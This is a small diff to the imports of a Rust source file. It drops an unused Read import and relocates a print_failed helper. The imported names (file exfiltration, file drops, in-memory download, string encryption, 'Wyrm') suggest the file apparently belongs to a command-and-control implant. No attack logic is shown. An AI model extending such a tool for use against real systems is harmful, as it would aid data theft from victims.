@@ -1,14 +1,14 @@
 use std::{
     fs::{self, File},
-    io::{self, Read, Write},
+    io::{self, Write},
     path::{Path, PathBuf},
 };
 
 use serde::Serialize;
-#[cfg(debug_assertions)]
-use shared::pretty_print::print_failed;
 use shared::tasks::{ExfiltratedFile, FileDropMetadata, WyrmResult};
 use str_crypter::{decrypt_string, sc};
+
+use crate::utils::console::print_failed;
 
 use crate::{
     comms::download_file_with_uri_in_memory,
